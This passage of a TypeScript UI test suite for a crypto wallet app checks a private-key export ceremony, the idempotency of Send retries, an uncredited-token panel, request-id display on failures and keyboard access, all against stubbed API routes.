  })

  it('BJ-WAL-17 T1: both sentences are in the page at body size, not in a tooltip', async () => {
    fresh()
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-3',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: fx.OWN_ADDRESS,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                watchedAt: '2026-08-03T09:00:05.000Z',
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        // Both distinctions, in the body text — which is what "at body size, not in a tooltip"
        // means operationally: `textContent` sees a paragraph and does not see a `title=`.
        assert.match(s.text(), /deposit address/i, 'the deposit-address sentence is missing')
        assert.match(s.text(), /managed wallet/i, 'the managed-wallet sentence is missing')
        assert.match(s.text(), /any other network is lost/i, 'the wrong-network consequence is not stated')
        // And neither is hidden behind an attribute a reader has to hover to find.
        const titled = [...s.document.querySelectorAll('[title]')].map((el) => el.getAttribute('title') ?? '')
        for (const t of titled) {
          assert.ok(!/managed wallet|deposit address/i.test(t), 'a required sentence is in a tooltip')
        }
      },
    )
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The key export ceremony — 05 journey 5. BJ-WAL-18..20 and BJ-ADV-21 were ⛔ on §8.2.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

const EXPORT_ID = fx.keyExport().id
const exportPanel = () => h(KeyExportPanel, { wallets: [fx.wallet()] })

/**
 * `GET /v1/exports` answering a different record on each call.
 *
 * The ceremony is a sequence of server-held states and the panel reloads after every step, so a
 * stub that returned one fixed body could not represent a ceremony advancing at all — every
 * scenario would assert the same stage twice and none of the transitions would be exercised.
 */
const exportsInOrder = (...stages: readonly (readonly unknown[])[]) =>
  (_w: unknown, n: number) => ({ body: { exports: stages[Math.min(n, stages.length) - 1] ?? [] } })

describe('BJ-WAL-18..20 / BJ-ADV-21 — the key export ceremony', () => {
  it('BJ-WAL-18 ★ T1: every stage is on screen, the hold is stated, and cancel is beside it', async () => {
    fresh()
    /*
     * ── THE HOLD MUST STILL BE PENDING, SO THE INSTANT IS RELATIVE TO NOW ──────────────────────
     *
     * This was the literal `2026-08-04T08:00:00.000Z`, which was comfortably in the future when it
     * was written and became the past at 08:00 UTC on 4 August 2026 — at which point this test
     * began failing on correct code, in CI and everywhere else, for a reason that had nothing to
     * do with the product.
     *
     * `keyexport.tsx` computes `holdOver` against `Date.now()`, and once the hold HAS passed
     * the panel deliberately renders "The 24-hour hold has passed" INSTEAD of the date. So a fixed
     * future instant is a fuse: this scenario asserts the date is on screen, and the date is only
     * on screen while the hold is pending.
     *
     * A day ahead of whenever the suite runs is what a real `cooling_off` record looks like —
     * custody sets `availableAt` 24 hours after the request — so this is also closer to the truth
     * than the literal was. The scenarios that need the OPPOSITE state use `2020-01-01`, which is
     * safe forever precisely because the past does not move.
     */
    const availableAt = new Date(Date.now() + 24 * 60 * 60 * 1000)
    const holding = fx.keyExport({ status: 'cooling_off', availableAt: availableAt.toISOString() })
    await withScreen(
      page(exportPanel(), '/wallet'),
      { url: `${ORIGIN}/wallet`, routes: { 'GET /v1/exports': { body: { exports: [holding] } } } },
      async (s) => {
        // The four stages custody holds, in order, all four visible at once — a ceremony whose
        // later stages are hidden until they arrive is a ceremony the user cannot consent to.
        const stages = [...s.document.querySelectorAll('.wt-stage')].map((el) => s.textOf(el))
        assert.equal(stages.length, 4, `expected the four stages custody holds, found ${stages.length}`)
        s.before('Cooling off', 'Second factor answered', 'the stages are out of order')
        s.before('Second factor answered', 'Key revealed', 'the stages are out of order')

        // The hold is stated WITH THE TIME custody sent, not with a duration this bundle computed.
        //
        // The expected string is built here from the SAME instant the fixture supplied, by an
        // independent transcription of the format rather than by importing the app's formatter —
        // two observations of one value, in opposite directions, per hazard 2 in this file's
        // header. Importing `utcDateTime` would compare the page against itself.
        const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        const pad = (n: number) => n.toString().padStart(2, '0')
        const shown =
          `${pad(availableAt.getUTCDate())} ${MONTHS[availableAt.getUTCMonth()]} ` +
          `${pad(availableAt.getUTCHours())}:${pad(availableAt.getUTCMinutes())}`
        assert.ok(
          s.text().includes(shown),
          `the availableAt custody sent is not on screen: expected "${shown}"`,
        )
        assert.match(s.text(), /you can stop this at any point/i, 'the cancel route is not stated')

        // Cancel is on screen at this stage, and the stage that has not been reached offers no
        // control — the screen renders custody's refusals rather than pre-empting them.
        assert.ok(s.queryByRole('button', 'Stop this export'), 'cancel is not offered')
        assert.equal(s.queryByRole('button', 'Reveal my key'), null, 'reveal is offered before the challenge')
      },
    )
  })

  it('BJ-WAL-18 ★ T1: the key is revealed once, and neither it nor the reveal token touches storage', async () => {
    fresh()
    const material = fx.revealed().material
    const revealToken = 'reveal-token-once-4c1d'
    const ready = fx.keyExport({ status: 'cooling_off', availableAt: '2020-01-01T00:00:00.000Z' })
    const challenged = fx.keyExport({
      status: 'challenged',
      challengedAt: '2026-08-04T08:00:00.000Z',
      tokenExpiresAt: '2026-08-04T08:05:00.000Z',
      format: 'raw',
    })

    await withScreen(
      page(exportPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        storage: SIGNED_IN,
        routes: {
          // 1st read: holding, hold elapsed. 2nd (after the challenge): challenged. 3rd: redeemed.
          'GET /v1/exports': exportsInOrder([ready], [challenged], []),
          [`POST /v1/exports/${EXPORT_ID}/challenge`]: {
            body: { export: challenged, revealToken },
          },
          [`POST /v1/exports/${EXPORT_ID}/redeem`]: { body: { export: fx.revealed() } },
        },
      },
      async (s) => {
        assert.match(s.text(), /hold has passed/i, 'the elapsed hold is not announced')
        await s.click(s.byRole('button', /second factor/i))

        // The token is held and the reveal control appears. Before this it did not exist.
        const reveal = s.byRole('button', 'Reveal my key')
        assert.ok(reveal, 'the reveal control did not appear after the challenge')
        // AND THE TOKEN IS NOT IN STORAGE. It is a bearer secret that yields a private key, and
        // localStorage survives the tab, every other tab, and a crash.
        assert.ok(
          !s.storageSnapshot().includes(revealToken),
          'the reveal token was written to storage',
        )

        await s.click(reveal)

        // The material is on the page, once, and announced.
        assert.ok(s.text().includes(material), 'the key material was not revealed')
        assert.ok(s.allByRole('alert').length > 0, 'the reveal is not announced')
        assert.match(s.text(), /not shown again|shown once/i, 'the once-only nature is not stated')

        // AND NOWHERE ELSE. This is the assertion that cannot be made by reading the page: the
        // material IS rendered, deliberately, so its presence proves nothing about storage.
        const stored = s.storageSnapshot()
        assert.ok(!stored.includes(material), 'the key material was written to storage')
        assert.ok(!stored.includes(revealToken), 'the reveal token was written to storage')
        // The two token keys this app legitimately holds are still the only things in there.
        assert.deepEqual(
          storedKeys(s).sort(),
          ['cf.accessToken', 'cf.refreshToken'],
          'the ceremony left something in storage',
        )

        // There is no copy button. A private key on the system clipboard is a private key every
        // other application on the machine can read.
        assert.equal(s.queryByRole('button', /copy/i), null, 'a copy control was offered for a private key')

        // The redemption carried the token that was minted in THIS run, and the passphrase field
        // was not sent for a `raw` format that has none.
        const redeemed = s.api.matching(`POST /v1/exports/${EXPORT_ID}/redeem`)
        assert.equal(redeemed.length, 1, 'the key was redeemed more than once')
        assert.deepEqual(redeemed[0]?.json, { revealToken })
      },
    )
  })

  it('BJ-WAL-19 T1: cancel is on screen at every stage and demands no second factor', async () => {
    fresh()
    // 05:296 — the whole point of the cooling-off is that the person who did NOT start this has
    // 24 hours to stop it, and a cancel that itself demanded a factor would be useless to someone
    // whose factor was stolen. Asserted at each stage the ceremony can be in.
    for (const status of ['requested', 'cooling_off', 'challenged'] as const) {
      await withScreen(
        page(exportPanel(), '/wallet'),
        {
          url: `${ORIGIN}/wallet`,
          routes: {
            'GET /v1/exports': { body: { exports: [fx.keyExport({ status })] } },
            [`POST /v1/exports/${EXPORT_ID}/cancel`]: { body: { export: fx.keyExport({ status: 'cancelled' }) } },
          },
        },
        async (s) => {
          const cancel = s.byRole('button', 'Stop this export')
          assert.ok(cancel, `cancel is not offered at stage ${status}`)
          assert.ok(!cancel.hasAttribute('disabled'), `cancel is disabled at stage ${status}`)
          await s.click(cancel)
          const sent = s.api.matching(`POST /v1/exports/${EXPORT_ID}/cancel`)
          assert.equal(sent.length, 1, `cancel did not fire at stage ${status}`)
          // No factor, no code, no passphrase — the request carries nothing but the identity of
          // the ceremony being stopped.
          assert.equal(sent[0]?.body, undefined, `cancel sent a body at stage ${status}`)
        },
      )
    }
  })

  it('BJ-WAL-20 T1: with no factor enrolled the page offers the enrolment route, not a disabled button', async () => {
    fresh()
    // custody's own refusal. This bundle asserts no rule about factors — it renders the sentence.
    const custodySentence = 'This export needs a second factor on your account. Enrol one first.'
    await withScreen(
      page(exportPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'GET /v1/exports': { body: { exports: [] } },
          'POST /v1/exports': {
            status: 403,
            body: fx.errorBody('mfa_required', custodySentence, [], 'cf-req-mfa1'),
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', 'Start the export'))

        assert.ok(s.text().includes(custodySentence), 'custody’s sentence is not on the page')
        // A ROUTE, not a dead control. A disabled button says "not now" and never says why.
        const route = s.byRole('link', /second factor/i)
        assert.equal(route.getAttribute('href'), '/security', 'the enrolment route does not go anywhere')
        // And the start control is still live rather than disabled — the refusal is custody's to
        // make on the next attempt, and pre-empting it here would be this bundle holding the rule.
        assert.ok(!s.byRole('button', 'Start the export').hasAttribute('disabled'))
        assert.ok(s.text().includes('cf-req-mfa1'), 'the request id is not on the page')
      },
    )
  })

  it('BJ-ADV-21-H1 ★ T1: two presses of Start the export produce one export request', async () => {
    fresh()
    await withScreen(
      page(exportPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'GET /v1/exports': { body: { exports: [] } },
          'POST /v1/exports': { status: 201, body: { export: fx.keyExport() }, delayMs: 20 },
        },
      },
      async (s) => {
        const start = s.byRole('button', 'Start the export')
        s.clickNoFlush(start)
        s.clickNoFlush(start)
        await s.settle(50)

        // Unlike Send, this route carries NO idempotency key — `custody/src/server.ts` does not
        // require one — so the count is the only guard there is, and it is worth asserting even
        // though the harness's scheduling is stricter than a browser's here rather than looser:
        // two dispatches inside one act() is the worst case, not the typical one.
        const posted = s.api.matching('POST /v1/exports')
        assert.equal(posted.length, 1, `two presses started ${posted.length} export ceremonies`)
        // Each ceremony starts a 24-hour clock and sends the user an email. A second one is not a
        // harmless duplicate; it is a second thing to cancel.
        assert.deepEqual(posted[0]?.json, { address: fx.OWN_ADDRESS, format: 'keystore' })
      },
    )
  })

  it('BJ-ADV-21-H2 ★ T1: after the reveal nothing re-arms a second redemption', async () => {
    fresh()
    const revealToken = 'reveal-token-spent-7b2e'
    const ready = fx.keyExport({ status: 'cooling_off', availableAt: '2020-01-01T00:00:00.000Z' })
    const challenged = fx.keyExport({ status: 'challenged', format: 'raw', tokenExpiresAt: '2026-08-04T08:05:00.000Z' })

    await withScreen(
      page(exportPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          // After the redemption the record is still `challenged` server-side in this stub — the
          // harshest arrangement, because it is the one in which a screen that trusted the SERVER
          // state alone would re-offer the reveal.
          'GET /v1/exports': exportsInOrder([ready], [challenged], [challenged], [challenged]),
          [`POST /v1/exports/${EXPORT_ID}/challenge`]: { body: { export: challenged, revealToken } },
          [`POST /v1/exports/${EXPORT_ID}/redeem`]: { body: { export: fx.revealed() } },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /second factor/i))
        await s.click(s.byRole('button', 'Reveal my key'))
        assert.ok(s.text().includes(fx.revealed().material), 'the key was not revealed')

        // Dismiss the reveal — the "back" a user actually performs on this screen, and the one
        // doc 22 calls the dangerous hazard: a back-button that re-arms a reveal.
        await s.click(s.byRole('button', 'I have saved it'))
        await s.back()

        // The token was spent and dropped, so there is no control that could post it again. The
        // page says the window has to be started afresh rather than offering a button that would
        // post a token this tab does not have.
        assert.equal(s.queryByRole('button', 'Reveal my key'), null, 'the reveal control re-armed')
        assert.match(s.text(), /no longer holds the reveal token|second factor again/i, 'the state is not explained')
        assert.equal(
          s.api.matching(`POST /v1/exports/${EXPORT_ID}/redeem`).length,
          1,
          'a second redemption was attempted',
        )
        // And the material is off the page. It is not held anywhere to be re-rendered.
        assert.ok(!s.text().includes(fx.revealed().material), 'the key material survived the dismissal')
        assert.ok(!s.storageSnapshot().includes(fx.revealed().material))
      },
    )
  })

  it('BJ-ADV-21-H5 ★ T1: a session that expires mid-ceremony says so, and no key material is on the page', async () => {
    fresh()
    await withScreen(
      page(exportPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        storage: SIGNED_IN,
        routes: {
          'GET /v1/exports': { body: { exports: [fx.keyExport({ status: 'cooling_off', availableAt: '2020-01-01T00:00:00.000Z' })] } },
          // The access token has expired and the refresh fails: the shape of a session that ended
          // while the user was standing on the ceremony.
          [`POST /v1/exports/${EXPORT_ID}/challenge`]: { status: 401, body: fx.errorBody('unauthorized', 'no') },
          'POST /auth/refresh': { status: 401, body: fx.errorBody('invalid_refresh_token', 'no') },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /second factor/i))

        // The re-authentication path, in words. `lib/api.ts` is where the sentence is set.
        assert.match(s.text(), /session expired|sign in again/i, 're-authentication is not offered in words')
        // And nothing that looks like a key is on the page — a failed challenge yields no token.
        assert.ok(!/KEYMATERIAL/.test(s.text()), 'key material is on the page after a failed challenge')
        assert.equal(s.queryByRole('button', 'Reveal my key'), null, 'reveal was armed by a failed challenge')
        // The tokens were cleared, so no stale session is left looking current.
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'an expired session was kept')
      },
    )
  })
})

/** Every key currently in `localStorage`. */
function storedKeys(s: Screen): string[] {
  const out: string[] = []
  const store = s.window.localStorage as unknown as Storage
  for (let i = 0; i < store.length; i += 1) {
    const k = store.key(i)
    if (k !== null) out.push(k)
  }
  return out
}

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   6.19 Group S — the adversarial matrix for Send. BJ-ADV-20 was ⛔★ "does not exist".
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-ADV-20 — Send, the six hazards', () => {
  it('BJ-ADV-20-H1 ★ T1: one armed intent carries one key across every retry; a new review mints a new one', async () => {
    fresh()
    // Every commit attempt records the key it carried. The key is not rendered anywhere — it
    // should not be — so what goes over the wire is the only honest way to observe it, and reading
    // `mintIdempotencyKey` out of `src/` instead would be asserting the implementation against
    // itself.
    const keys: string[] = []
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          // A refusal that leaves the intent armed, so the same intent can be retried in place —
          // which is the "retry after a timeout" the key exists to make safe.
          'POST /v1/withdrawals': (w) => {
            keys.push(w.headers['idempotency-key'] ?? '')
            return { status: 503, body: fx.errorBody('upstream_unavailable', 'The chain node did not answer.') }
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        await s.click(s.byRole('button', 'Send it'))
        await s.click(s.byRole('button', 'Send it'))

        // THE PROPERTY DOC 22 NAMES: minted when the intent forms, NOT per fetch. Three attempts
        // at one intent are one key, so the service replays rather than paying three times.
        assert.equal(keys.length, 3, 'the retries did not happen')
        assert.equal(
          new Set(keys).size,
          1,
          `three retries of one intent sent ${new Set(keys).size} keys: ${[...new Set(keys)].join(', ')}. ` +
            `A key minted per fetch means a retry moves money twice — wallet/src/idempotency.ts.`,
        )
        assert.match(keys[0] ?? '', /^withdraw:/, 'the key does not name the intent it is for')

        // A FRESH REVIEW IS A FRESH INTENT. `Edit` discards rather than returns to, so a change of
        // mind always produces a new key — which is what stops a settled intent from being
        // re-committed under the key that settled it (BJ-ADV-20-H2).
        await s.click(s.byRole('button', 'Edit'))
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        assert.equal(keys.length, 4)
        assert.notEqual(keys[3], keys[0], 'a fresh review re-used the previous intent’s key')

        // And a changed intent is certainly a different key. Re-using one across two different
        // bodies is a 409 from the service and would be this bundle’s bug, not the user’s.
        await s.click(s.byRole('button', 'Edit'))
        await arm(s, fx.OTHER_ADDRESS, '2')
        await s.click(s.byRole('button', 'Send it'))
        assert.equal(new Set(keys).size, 3, 'a changed amount did not produce a distinct key')
        // The bodies differ, which is what makes sharing a key a defect rather than a nicety.
        const bodies = s.api.matching('POST /v1/withdrawals').map((w) => JSON.stringify(w.json))
        assert.notEqual(bodies[0], bodies[bodies.length - 1], 'the scenario never changed the intent')
      },
    )
  })

  it('BJ-ADV-20-H2 ★ T1: a settled intent cannot be re-committed under the key that settled it', async () => {
    fresh()
    const keys: string[] = []
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': (w) => {
            keys.push(w.headers['idempotency-key'] ?? '')
            return { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } }
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        await s.click(s.byRole('button', 'Done'))

        // Arm the SAME values again — the state a user reaches by going back and re-entering.
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))

        assert.equal(keys.length, 2, 'the second commit did not happen')
        assert.notEqual(
          keys[0],
          keys[1],
          'a settled intent was re-committed under the key that settled it, so the service would ' +
            'replay the first withdrawal and the user would believe they had sent a second',
        )
      },
    )
  })

  it('BJ-ADV-20-H4 ★ T1: a refusal leaves the confirmation step and the intent intact', async () => {
    fresh()
    const sentence = 'That destination is not withdrawable for this asset.'
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': { status: 422, requestId: 'cf-req-h4', body: fx.errorBody('not_withdrawable', sentence, [], 'cf-req-h4') },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        const shown = destinationShown(s)
        await s.click(s.byRole('button', 'Send it'))

        // The UI did not move to a success it did not have.
        assert.ok(!s.text().includes('Withdrawal requested'), 'a refusal rendered a receipt')
        assert.ok(s.text().includes(sentence), 'the service’s reason is not shown')
        assert.ok(s.text().includes('cf-req-h4'), 'the request id is not shown')
        // And the intent survives, unchanged, so the user can retry it rather than retype it.
        assert.equal(destinationShown(s), shown, 'the intent changed under a refusal')
        assert.ok(s.queryByRole('button', 'Send it'), 'a retryable refusal removed the commit control')
      },
    )
  })

  it('BJ-ADV-20-H4 ★ T1: a 409 key-reuse DROPS the intent, because that one is this bundle’s bug', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': {
            status: 409,
            body: fx.errorBody('idempotency_key_reused', 'That key has already been used for a different payment.'),
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))

        // `idempotency_key_reused` means two different intents were sent under one key — a defect
        // in this bundle rather than something the user can fix. Pressing Confirm again against a
        // key the service has already bound would repeat it for ever, so the intent is dropped.
        assert.equal(s.queryByRole('button', 'Send it'), null, 'a 409 left the commit control armed')
        assert.ok(s.text().includes('already been used'), 'the refusal is not shown')
      },
    )
  })

  it('BJ-ADV-20-H5 ★ T1: a session that expires mid-send shows the re-authentication path', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        storage: SIGNED_IN,
        routes: {
          'POST /v1/withdrawals': { status: 401, body: fx.errorBody('unauthorized', 'no') },
          'POST /auth/refresh': { status: 401, body: fx.errorBody('invalid_refresh_token', 'no') },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))

        assert.match(s.text(), /session expired|sign in again/i, 're-authentication is not offered in words')
        // NO STALE DATA LEFT RENDERED AS CURRENT — the hazard's own words. There is no receipt,
        // so nothing claims a withdrawal was made under a session that had already ended.
        assert.ok(!s.text().includes('Withdrawal requested'), 'an expired session rendered a receipt')
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'the dead session was kept')
        // Exactly one refresh was attempted, not one per request: ten refreshes against a rotating
        // refresh token signs the user out while they hold a valid session.
        assert.equal(s.api.matching('POST /auth/refresh').length, 1)
      },
    )
  })

  it('BJ-ADV-20-H6 ★ T1: with the balance unreadable no control is offered that would post against it', async () => {
    fresh()
    // The degraded-upstream shape this screen can actually be in: hub-api answered 200 with a hole
    // rather than failing, so the page paints and the Send panel has nothing to work from.
    await withScreen(
      page(
        h(SendPanel, {
          holdings: [],
          wallets: [],
          balanceAbsent: { upstream: 'ledger', reason: 'ledger did not answer within the budget' },
          onSent: () => undefined,
        }),
        '/wallet',
      ),
      { url: `${ORIGIN}/wallet`, routes: {} },
      async (s) => {
        // The reason is stated rather than the control left clickable into a service that cannot
        // answer — and rather than a zero, which is the other way to be wrong here.
        assert.match(s.text(), /could not read your balances/i, 'the reason is not stated')
        assert.ok(s.text().includes('ledger did not answer within the budget'), 'the upstream’s own reason is missing')
        assert.equal(s.queryByRole('button', 'Review'), null, 'a commit path was offered against an unread balance')
        assert.equal(s.allByRole('textbox').length, 0, 'an amount field was offered against an unread balance')
        assert.ok(s.allByRole('alert').length > 0, 'the degradation is not announced')
      },
    )
  })
})

describe('BJ-TOKEN-UNCREDITED — a token that arrived and was not credited', () => {
  const PANEL = 'Tokens we could not credit'

  /**
   * ── WHY THE ASSERTION IS "UNDIVIDED", AND WHY THAT IS A CLIENT FACT RATHER THAN A RULE ────────
   *
   * micro-org#200: somebody sends USDT to their ETH deposit address. It confirms, custody holds the
   * key, and until this panel existed nothing in the estate told the person it had happened. The
   * money is not lost and it is also not theirs to move — which is a sentence that has to be got
   * right, because the paragraph beside it on the same screen warns about the WRONG NETWORK, where
   * the money IS gone. Two adjacent warnings with opposite endings.
   *
   * The figure is the part a browser can get wrong on its own. `micro-wallet` serves the raw
   * integer and no formatted twin, deliberately: nothing here carries the token's decimals, and
   * that absence is the reason the deposit is uncredited at all. So the scenario asserts the digits
   * returned in THIS RUN appear on the page as they were returned — two observations of one value,
   * in opposite directions, per the rule at the top of this file. The fixture's amount is not a
   * round power of ten precisely so that a `/ 10n ** 18n` slipped in later cannot render something
   * that still looks right.
   */
  it('BJ-TOKEN-UNCREDITED T1: the sighting is shown with the raw figure the service returned, marked not credited', async () => {
    fresh()
    const sighting = fx.tokenSighting()
    const { element, options } = walletPageAt(
      {
        portfolio: fx.ok(fx.portfolio(), 'ledger+pricing'),
        wallets: fx.ok([fx.wallet()], 'wallet'),
      },
      [],
      [sighting],
    )

    await withScreen(element, options, async (s) => {
      const body = s.textOf(panel(s, PANEL))

      // 1. The figure, exactly as the service returned it in this run. Not scaled, not grouped.
      assert.ok(
        body.includes(sighting.amount),
        `the raw figure the service returned is not on the page: "${body}"`,
      )
      // 2. And the figure AS RENDERED carries no other digits, which is the assertion (1) cannot
      //    make on its own: a page that printed both the raw integer and a helpfully-divided
      //    reading of it beside would satisfy (1). Digits only, so thousands separators — which
      //    are non-digits and change nothing about the value — stay allowed, while a division or a
      //    truncation changes the digits and fails here.
      //
      //    Asserting this on the ELEMENT rather than on a substring of the page is deliberate: the
      //    first draft of this scenario compared against `amount / 10n ** 18n`, which for a
      //    sub-decimal token amount is the string "0" — a digit that occurs in the token address,
      //    the timestamp and the confirmation count, so the guard fired on correct output.
      const figure = panel(s, PANEL).querySelector('.wt-row__title')
      assert.ok(figure, 'the sighting row renders no figure element')
      assert.equal(
        s.textOf(figure).replace(/[^0-9]/g, ''),
        sighting.amount,
        'the figure on the page is not the figure the service returned, digit for digit',
      )
      // ...and it is LABELLED as raw, so the reader is not left to assume a scale either.
      assert.match(s.textOf(figure), /raw units/i, 'the unscaled figure is not marked as unscaled')
      // 3. The two facts a reader needs, in words: it is not in the balance, and it is not lost.
      assert.match(body, /not credited/i, 'the row does not say the token was not credited')
      assert.match(body, /not lost/i, 'the panel does not say the money still exists')
      assert.match(body, /not part of your balance/i, 'the panel does not say it is outside the balance')
      // 4. Announced rather than merely tinted — this is money the reader did not expect to lose
      //    sight of.
      assert.ok(panel(s, PANEL).querySelector('[role="alert"]'), 'the panel is not announced')
      // 5. The transaction is quotable, because the remedy is a support request.
      assert.ok(body.length > 0 && s.textOf(panel(s, PANEL)).includes(sighting.chain), 'the chain is not named')
    })
  })

  /**
   * An exception report renders nothing when there is no exception.
   *
   * This is the ordinary case for every user, and it is asserted rather than assumed because the
   * opposite — a permanent panel reading "no tokens have been lost at your deposit addresses" on
   * every visit — is a sentence that teaches people to stop reading this page, and it would make
   * assertion (1) above pass while the panel was useless.
   */
  it('BJ-TOKEN-UNCREDITED T1: with nothing uncredited the panel is absent, not empty', async () => {
    fresh()
    const { element, options } = walletPageAt({
      portfolio: fx.ok(fx.portfolio(), 'ledger+pricing'),
      wallets: fx.ok([fx.wallet()], 'wallet'),
    })
    await withScreen(element, options, async (s) => {
      const headings = [...s.document.querySelectorAll('h2')].map((el) => (el.textContent ?? '').trim())
      assert.ok(!headings.includes(PANEL), 'an exception report drew itself with no exception to report')
      assert.ok(!/not credited/i.test(s.text()), 'the page warns about uncredited tokens with none')
    })
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The holes this surface names rather than hides, and the two accessibility rows.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-WAL-21-ABSENT / BJ-ADV-23 / BJ-A11Y — what is missing, and reaching what is not', () => {
  it('BJ-WAL-21-ABSENT T1: the features this surface does not build are named with their reasons', async () => {
    fresh()
    const { element, options } = walletPageAt({
      portfolio: fx.ok(fx.portfolio(), 'ledger+pricing'),
      wallets: fx.ok([fx.wallet()], 'wallet'),
    })
    await withScreen(element, options, async (s) => {
      const body = s.text()
      // "not built" must be visibly different from "empty" and from "failed" — the same three-way
      // distinction states.tsx makes for a request, applied to a capability. hub-api's own
      // notifications tile records why: "a client given no tile at all shows nothing and nobody
      // notices the feature is missing".
      for (const [what, why] of [
        ['Transfers and conversions', /lists what you did afterwards|internal identifier/i],
        ['Connecting an external wallet', /no way to reach a browser extension or a hardware device/i],
      ] as const) {
        assert.ok(body.includes(what), `${what} is not named on the page`)
        assert.match(body, why, `${what} is named without its reason`)
      }
      // And they are marked as holes rather than looking like empty features.
      const holes = [...s.document.querySelectorAll('.wt-panel--hole')]
      assert.equal(holes.length, 2, `expected two named holes, found ${holes.length}`)
      for (const hole of holes) {
        assert.match(s.textOf(hole), /not composed/, 'a hole is not labelled as one')
      }
    })
  })

  it('BJ-ADV-23 ★ T1: every failure state on these screens renders the request id to quote', async () => {
    fresh()
    // One request id, arranged by this scenario, looked for in each of the failure states these
    // two screens can reach. The value is the scenario's; the page never told it what to expect.
    const requestId = 'cf-req-adv23'
    const cases: ReadonlyArray<readonly [string, () => Promise<void>]> = [
      [
        'Send refused',
        async () => {
          await withScreen(
            page(sendPanel(), '/wallet'),
            {
              url: `${ORIGIN}/wallet`,
              routes: { 'POST /v1/withdrawals': { status: 422, requestId, body: fx.errorBody('x', 'No.', [], requestId) } },
            },
            async (s) => {
              await arm(s, fx.OTHER_ADDRESS, '1')
              await s.click(s.byRole('button', 'Send it'))
              assert.ok(s.text().includes(requestId), 'the Send refusal offers no request id')
            },
          )
        },
      ],
      [
        'Receive refused',
        async () => {
          await withScreen(
            page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
            {
              url: `${ORIGIN}/wallet`,
              routes: { 'POST /v1/deposits': { status: 503, requestId, body: fx.errorBody('x', 'No.', [], requestId) } },
            },
            async (s) => {
              await s.click(s.byRole('button', /deposit address/i))
              assert.ok(s.text().includes(requestId), 'the Receive failure offers no request id')
            },
          )
        },
      ],
      [
        'the export ceremony refused',
        async () => {
          await withScreen(
            page(exportPanel(), '/wallet'),
            {
              url: `${ORIGIN}/wallet`,
              routes: {
                'GET /v1/exports': { body: { exports: [] } },
                'POST /v1/exports': { status: 403, requestId, body: fx.errorBody('x', 'No.', [], requestId) },
              },
            },
            async (s) => {
              await s.click(s.byRole('button', 'Start the export'))
              assert.ok(s.text().includes(requestId), 'the export refusal offers no request id')
            },
          )
        },
      ],
      [
        'sign-in refused',
        async () => {
          await withScreen(
            page(h(SignInPage), '/account/login'),
            {
              url: `${ORIGIN}/account/login`,
              routes: { [`POST ${IDENTITY_ROUTES.login}`]: { status: 401, requestId, body: fx.errorBody('x', 'No.', [], requestId) } },
            },
            async (s) => {
              await s.type(s.byRole('textbox', 'Email or handle'), 'a@b.c')
              await s.type(labelled(s, 'Password'), 'x')
              await s.click(s.byRole('button', 'Sign in'))
              assert.ok(s.text().includes(requestId), 'the sign-in refusal offers no request id')
            },
          )
        },
      ],
    ]
    for (const [name, run] of cases) {
      fresh()
      await run().catch((err: unknown) => {
        assert.fail(`${name}: ${err instanceof Error ? err.message : String(err)}`)
      })
    }
  })

  it('BJ-A11Y-13 ★ T1: the send flow is completable by keyboard, and commit is unreachable until armed', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } } },
      },
      async (s) => {
        // Every control of the unarmed form is in the tab order, in document order.
